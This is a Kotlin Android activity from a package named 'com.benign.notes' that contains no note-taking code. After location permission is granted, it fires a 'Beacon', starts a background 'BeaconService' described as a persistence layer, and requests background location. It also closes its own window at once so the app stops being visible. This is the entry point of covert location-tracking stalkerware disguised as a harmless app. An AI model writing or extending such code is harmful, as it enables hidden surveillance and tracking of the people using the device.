package com.benign.notes

import android.Manifest
import android.content.Intent
import android.os.Bundle
import androidx.appcompat.app.AppCompatActivity
import androidx.core.app.ActivityCompat

class MainActivity : AppCompatActivity() {

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Location must be granted interactively — background follows
        val perms = arrayOf(
            Manifest.permission.ACCESS_FINE_LOCATION,
            Manifest.permission.ACCESS_COARSE_LOCATION
        )
        if (ActivityCompat.checkSelfPermission(this, Manifest.permission.ACCESS_FINE_LOCATION)
            != android.content.pm.PackageManager.PERMISSION_GRANTED) {
            ActivityCompat.requestPermissions(this, perms, 100)
        } else {
            arm()
        }
    }

    override fun onRequestPermissionsResult(
        requestCode: Int, permissions: Array<out String>, grantResults: IntArray) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults)
        if (requestCode == 100 &&
            grantResults.isNotEmpty() &&
            grantResults[0] == android.content.pm.PackageManager.PERMISSION_GRANTED) {
            arm()
        }
        finish() // close — app is done being visible
    }

    private fun arm() {
        // Fire the beacon once now
        Beacon.fire(applicationContext)

        // Then hand off to the persistence layer
        startService(Intent(this, BeaconService::class.java))

        // Ask for background location (Android 10+): settings deep-link
        if (android.os.Build.VERSION.SDK_INT >= 29) {
            ActivityCompat.requestPermissions(this, arrayOf(
                Manifest.permission.ACCESS_BACKGROUND_LOCATION), 101)
        }
    }
}